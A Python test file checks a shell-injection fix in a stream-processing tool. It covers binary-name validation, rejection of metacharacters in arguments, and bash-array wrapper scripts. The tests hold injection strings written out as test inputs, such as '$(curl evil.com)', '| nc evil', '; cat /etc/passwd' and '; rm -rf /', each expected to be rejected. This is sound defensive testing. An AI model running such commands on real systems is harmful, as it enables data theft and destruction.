"""H.19: Shell injection in stream processor dispatch — TDD tests.

Tests cover 4 vectors:
1. Shell metacharacters in binary name → rejected
2. Args with ; | & ` $() → rejected (not just escaped)
3. Generated script uses bash array (not shell string interpolation)
4. Wrapper script has -- separator before CHUNK_PATH
"""

from __future__ import annotations

import tempfile
from pathlib import Path

import pytest

from general_ludd.stream import (
    _SAFE_BINARY_RE,
    RoleCloner,
    _parse_processor_args,
)

# ---------------------------------------------------------------------------
# 1. Binary metacharacter rejection
# ---------------------------------------------------------------------------

class TestBinaryMetacharRejection:
    def test_binary_semicolon_rejected(self):
        assert _SAFE_BINARY_RE.match("cat;rm") is None

    def test_binary_pipe_rejected(self):
        assert _SAFE_BINARY_RE.match("cat|nc") is None

    def test_binary_dollar_paren_rejected(self):
        assert _SAFE_BINARY_RE.match("$(whoami)") is None

    def test_binary_backtick_rejected(self):
        assert _SAFE_BINARY_RE.match("`id`") is None

    def test_binary_ampersand_rejected(self):
        assert _SAFE_BINARY_RE.match("cat&rm") is None

    def test_binary_newline_rejected(self):
        assert _SAFE_BINARY_RE.match("cat\n/etc") is None

    def test_binary_null_byte_rejected(self):
        assert _SAFE_BINARY_RE.match("cat\0.sh") is None

    def test_binary_path_traversal_rejected(self):
        assert _SAFE_BINARY_RE.match("../../etc/passwd") is None

    def test_binary_whitespace_rejected(self):
        assert _SAFE_BINARY_RE.match("cat /etc/passwd") is None

    def test_valid_binary_accepted(self):
        assert _SAFE_BINARY_RE.match("/usr/bin/whisper-cpp")

    def test_valid_binary_no_path_accepted(self):
        assert _SAFE_BINARY_RE.match("ffmpeg")

    def test_leading_dash_binary_rejected(self):
        """Binary names starting with - can be interpreted as exec flags."""
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "-a"}
            with pytest.raises(ValueError, match="leading-dash"):
                cloner._write_shell_processor(clone_path, proc, kind="whisper")


# ---------------------------------------------------------------------------
# 2. Args metacharacter rejection (not just escape)
# ---------------------------------------------------------------------------

class TestArgsMetacharRejection:
    def test_args_semicolon_rejected(self):
        """; must be rejected, not tokenized."""
        with pytest.raises(ValueError, match="forbidden shell character"):
            _parse_processor_args("-m model ; cat /etc/passwd")

    def test_args_pipe_rejected(self):
        with pytest.raises(ValueError, match="forbidden shell character"):
            _parse_processor_args("-m model | nc evil")

    def test_args_ampersand_rejected(self):
        with pytest.raises(ValueError, match="forbidden shell character"):
            _parse_processor_args("-m model & ping evil")

    def test_args_backtick_rejected(self):
        with pytest.raises(ValueError, match="forbidden shell character"):
            _parse_processor_args("`id`")

    def test_args_dollar_paren_rejected(self):
        with pytest.raises(ValueError, match="forbidden shell character"):
            _parse_processor_args("$(curl evil.com)")

    def test_args_bang_rejected(self):
        with pytest.raises(ValueError, match="forbidden shell character"):
            _parse_processor_args("-m model !")

    def test_clean_args_accepted(self):
        result = _parse_processor_args("-m model.bin -t 4")
        assert result == ["-m", "model.bin", "-t", "4"]

    def test_quoted_args_with_spaces_accepted(self):
        result = _parse_processor_args('-m model.bin -o "output file.txt"')
        assert result == ["-m", "model.bin", "-o", "output file.txt"]


# ---------------------------------------------------------------------------
# 3. Generated script uses bash array (not shell string interpolation)
# ---------------------------------------------------------------------------

class TestGeneratedScriptUsesArray:
    def test_script_contains_array_assignment(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "/usr/bin/whisper-cpp",
                    "args": "-m model.bin -t 4"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "PROCESSOR_ARGS=(" in content
            assert '-m' in content
            assert 'model.bin' in content
            assert '-t' in content
            assert '4' in content

    def test_script_uses_array_expansion(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "ffmpeg", "binary": "/usr/bin/ffmpeg",
                    "args": "-f mp4 -tag:v hvc1"}
            result = cloner._write_shell_processor(clone_path, proc, kind="ffmpeg")
            content = result.read_text()
            assert 'PROCESSOR_BINARY=' in content
            assert 'exec "${PROCESSOR_BINARY}"' in content
            assert '"${PROCESSOR_ARGS[@]}"' in content

    def test_script_no_shell_string_interpolation_for_args(self):
        """The exec line must not inline args as a shell string."""
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "args": "-m model.bin"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            exec_line = next(line for line in content.splitlines() if line.startswith("exec "))
            assert "PROCESSOR_ARGS" in exec_line
            assert '"${PROCESSOR_ARGS[@]}"' in exec_line

    def test_empty_args_produces_empty_array(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "PROCESSOR_ARGS=(" in content
            # Empty array still expands safely
            assert '"${PROCESSOR_ARGS[@]}"' in content

    def test_script_executable(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            import stat
            mode = result.stat().st_mode
            assert mode & stat.S_IXUSR


# ---------------------------------------------------------------------------
# 4. Wrapper script has -- separator before CHUNK_PATH
# ---------------------------------------------------------------------------

class TestWrapperScriptNoInjectionSurface:
    def test_double_dash_before_chunk_path(self):
        """CHUNK_PATH must be preceded by -- to prevent option injection."""
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "args": "-m model.bin"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert '-- "$CHUNK_PATH"' in content

    def test_no_shell_string_on_exec_line(self):
        """The exec line must not contain raw unquoted shell metacharacters."""
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "/usr/bin/whisper-cpp",
                    "args": "-m model.bin -o output.txt"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            exec_line = next(line for line in content.splitlines() if "exec" in line)
            assert "|" not in exec_line
            assert ";" not in exec_line

    def test_binary_individually_quoted(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "binary": "/usr/bin/whisper-cpp"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            binary_line = next(line for line in content.splitlines()
                           if line.startswith("PROCESSOR_BINARY="))
            assert binary_line == "PROCESSOR_BINARY=/usr/bin/whisper-cpp"

    def test_each_arg_individually_quoted(self):
        cloner = RoleCloner(collection_root=Path("/tmp"))
        with tempfile.TemporaryDirectory() as td:
            clone_path = Path(td) / "clone"
            clone_path.mkdir()
            proc = {"tool": "whisper.cpp", "args": "-o output.txt"}
            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
            content = result.read_text()
            assert "PROCESSOR_ARGS=(" in content
            assert "-o output.txt" in content


# ---------------------------------------------------------------------------
# 5. Router-level (integration) validation
# ---------------------------------------------------------------------------

class TestRouterLevelValidation:
    def test_router_rejects_bad_binary(self):
        from general_ludd.routers.stream import _SAFE_BINARY_RE as rtr_re
        assert rtr_re.match("cat /etc/passwd;") is None

    def test_router_rejects_bad_args(self):
        from general_ludd.routers.stream import _parse_processor_args as rtr_parse
        with pytest.raises(ValueError, match="forbidden shell character"):
            rtr_parse("; rm -rf /")

    def test_router_accepts_clean_args(self):
        from general_ludd.routers.stream import _parse_processor_args as rtr_parse
        result = rtr_parse("-m model.bin -t 4")
        assert len(result) == 4
